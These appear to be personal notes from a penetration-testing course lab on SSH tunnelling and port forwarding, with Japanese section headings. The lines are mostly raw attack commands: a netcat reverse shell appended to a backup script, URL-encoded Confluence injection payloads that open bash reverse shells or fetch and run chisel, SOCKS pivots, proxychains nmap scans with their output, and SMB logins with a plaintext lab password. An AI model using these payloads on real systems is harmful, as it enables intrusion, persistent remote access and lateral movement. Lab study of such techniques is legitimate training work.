echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.248 1234 >/tmp/f" >> user_backups.sh

1台目
10.4.230.215

machine 2
192.168.230.63

kali
192.168.45.198 

curl http://192.168.196.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.245/4444%200%3E%261%27%29.start%28%29%22%29%7D/

socat -ddd TCP-LISTEN:2222,fork TCP:10.4.230.215:22

psql -h 192.168.230.63 -p 2345 -U postgres

ssh database_admin@192.168.230.63 -p2222


10.4.230.215
ポート リダイレクトと SSH トンネリング - SSH ローカル ポート フォワーディング - グループ 1 - PGDATABASE01 OS 認証情報:

No credentials were provided for this machine
172.16.230.217
ポート リダイレクションと SSH トンネリング - SSH ローカル ポート フォワーディング - グループ 1 - HRSHARES OS 資格情報:

No credentials were provided for this machine
192.168.230.63

ssh -N -L 0.0.0.0:4455:172.16.230.217:445 database_admin@10.4.230.215
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215

smbclient -p 4455 //192.168.230.63/scripts -U hr_admin --password=Welcome1234

ssh database_admin@10.4.230.215

18.3.1. SSHローカルポート転送
i didnt understand below command,when implementing below code ,i could used ssh local port fording. 
python3 -c 'import pty; pty.spawn("/bin/bash")'

database
10.4.204.215

192.168.204.63
ポート リダイレクトと SSH トンネリング - SSH 動的ポート転送 - CONFLUENCE01 OS 認証情報:

No credentials were provided for this machine
10.4.204.215
ポート リダイレクトと SSH トンネリング - SSH 動的ポート転送 - PGDATABASE01 OS 認証情報:

No credentials were provided for this machine
172.16.204.217
ポート リダイレクションと SSH トンネリング - SSH 動的ポート転送 - HRSHARES OS 認証情報:

No credentials were provided for thi

ssh -N -D 0.0.0.0:9999 database_admin@10.4.204.215

proxychains smbclient -L //172.16.204.217/ -U hr_admin --password=Welcome1234

proxychains nmap -sT -p 4800-4900 172.16.204.217
nmap 172.16.204.217 -sT -p 4800-4900

proxychains nmap -vvv -sT -p 4800-4900 -Pn 172.16.204.


proxychains curl -O http://192.168.204.63:8090/exercises/client_source.zip
curl -O http://192.168.45.198:8000/linpeas.sh 

smbclient //172.16.204.217/scripts -U hr_admin --password=Welcome1234

proxychains smbclient -L //172.16.204.217/ -U hr_admin --password=Welcome1234

192.168.204.63/exercises/client_source.zip

PORT     STATE  SERVICE        REASON
4800/tcp closed iims           conn-refused
4801/tcp closed iwec           conn-refused
4802/tcp closed ilss           conn-refused
4803/tcp closed notateit       conn-refused
4804/tcp closed aja-ntv4-disc  conn-refused
4805/tcp closed unknown        conn-refused
4806/tcp closed unknown        conn-refused
4807/tcp closed unknown        conn-refused
4808/tcp closed unknown        conn-refused
4809/tcp closed unknown        conn-refused
4810/tcp closed unknown        conn-refused
4811/tcp closed unknown        conn-refused
4812/tcp closed unknown        conn-refused
4813/tcp closed unknown        conn-refused
4814/tcp closed unknown        conn-refused
4815/tcp closed unknown        conn-refused
4816/tcp closed unknown        conn-refused
4817/tcp closed unknown        conn-refused
4818/tcp closed unknown        conn-refused
4819/tcp closed unknown        conn-refused
4820/tcp closed unknown        conn-refused
4821/tcp closed unknown        conn-refused
4822/tcp closed unknown        conn-refused
4823/tcp closed unknown        conn-refused
4824/tcp closed unknown        conn-refused
4825/tcp closed unknown        conn-refused
4826/tcp closed unknown        conn-refused
4827/tcp closed htcp           conn-refused
4828/tcp closed unknown        conn-refused
4829/tcp closed unknown        conn-refused
4830/tcp closed unknown        conn-refused
4831/tcp closed unknown        conn-refused
4832/tcp closed unknown        conn-refused
4833/tcp closed unknown        conn-refused
4834/tcp closed unknown        conn-refused
4835/tcp closed unknown        conn-refused
4836/tcp closed unknown        conn-refused
4837/tcp closed varadero-0     conn-refused
4838/tcp closed varadero-1     conn-refused
4839/tcp closed varadero-2     conn-refused
4840/tcp closed opcua-tcp      conn-refused
4841/tcp closed quosa          conn-refused
4842/tcp closed gw-asv         conn-refused
4843/tcp closed opcua-tls      conn-refused
4844/tcp closed gw-log         conn-refused
4845/tcp closed wcr-remlib     conn-refused
4846/tcp closed contamac_icm   conn-refused
4847/tcp closed wfc            conn-refused
4848/tcp closed appserv-http   conn-refused
4849/tcp closed appserv-https  conn-refused
4850/tcp closed sun-as-nodeagt conn-refused
4851/tcp closed derby-repli    conn-refused
4852/tcp closed unknown        conn-refused
4853/tcp closed unknown        conn-refused
4854/tcp closed unknown        conn-refused
4855/tcp closed unknown        conn-refused
4856/tcp closed unknown        conn-refused
4857/tcp closed unknown        conn-refused
4858/tcp closed unknown        conn-refused
4859/tcp closed unknown        conn-refused
4860/tcp closed unknown        conn-refused
4861/tcp closed unknown        conn-refused
4862/tcp closed unknown        conn-refused
4863/tcp closed unknown        conn-refused
4864/tcp closed unknown        conn-refused
4865/tcp closed unknown        conn-refused
4866/tcp closed unknown        conn-refused
4867/tcp closed unify-debug    conn-refused
4868/tcp closed phrelay        conn-refused
4869/tcp closed phrelaydbg     conn-refused
4870/tcp closed cc-tracking    conn-refused
4871/tcp closed wired          conn-refused
4872/tcp open   unknown        syn-ack
4873/tcp closed unknown        conn-refused
4874/tcp closed unknown        conn-refused
4875/tcp closed unknown        conn-refused
4876/tcp closed tritium-can    conn-refused
4877/tcp closed lmcs           conn-refused
4878/tcp closed inst-discovery conn-refused
4879/tcp closed wsdl-event     conn-refused
4880/tcp closed hislip         conn-refused
4881/tcp closed socp-t         conn-refused
4882/tcp closed socp-c         conn-refused
4883/tcp closed wmlserver      conn-refused
4884/tcp closed hivestor       conn-refused
4885/tcp closed abbs           conn-refused
4886/tcp closed unknown        conn-refused
4887/tcp closed unknown        conn-refused
4888/tcp closed xcap-portal    conn-refused
4889/tcp closed xcap-control   conn-refused
4890/tcp closed unknown        conn-refused
4891/tcp closed unknown        conn-refused
4892/tcp closed unknown        conn-refused
4893/tcp closed unknown        conn-refused
4894/tcp closed lyskom         conn-refused
4895/tcp closed unknown        conn-refused
4896/tcp closed unknown        conn-refused
4897/tcp closed unknown        conn-refused
4898/tcp closed unknown        conn-refused
4899/tcp closed radmin         conn-refused
4900/tcp closed hfcs           conn-refused


ssh -N -D 0.0.0.0:9999 database_admin@10.4.204.215


nmap -sn 172.16.29.1-254
http://10.5.16.121/

curl http://192.168.196.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.245/3333%200%3E%261%27%29.start%28%29%22%29%7D/

10.4.196.215
ポート リダイレクトと SSH トンネリング - SSH リモート ポート転送 - グループ 2 - PGDATABASE01 OS 認証情報:

No credentials were provided for this machine
192.168.196.63
ポート リダイレクトと SSH トンネリング - SSH リモート ポート転送 - グループ 2 - CONFLUENCE01 OS 資格情報:

No credentials were pro


ssh -N -R 127.0.0.1:2345:10.4.196.215:4444 kali@192.168.45.245

curl -O http://192.168.196.63:8090/exercises/ssh_remote_client


192.168.196.63
ポート リダイレクトと SSH トンネリング - SSH リモート動的ポート転送 - CONFLUENCE01 OS 資格情報:

No credentials were provided for this machine
192.168.196.64
ポート リダイレクトと SSH トンネリング - SSH リモート動的ポート転送 - MULTISERVER03 OS 資格情報:

No credentials were provided for this machine
10.4.196.215
ポート リダイレクトと SSH トンネリング - SSH 動的ポート転送 - PGDATABASE01 OS 認証情報:

No credentials were provided for this machine


ssh -N -R 9998 kali@192.168.45.245

proxychains nmap -sT -p 9000-9100 192.168.196.64

proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.196.215


curl http://192.168.186.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.244/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/


curl http://192.168.186.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.244/3333%200%3E%261%27%29.start%28%29%22%29%7D/

wget 192.168.45.244:8000/chisel -O /tmp/chisel && chmod +x /tmp/chisel

curl -O http://192.168.45.198:8000/linpeas.sh 

/tmp/chisel client 192.168.45.244:8080 R:socks > /dev/null 2>&1 &

curl http://192.168.186.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.244:8080%20R:socks%27%29.start%28%29%22%29%7D/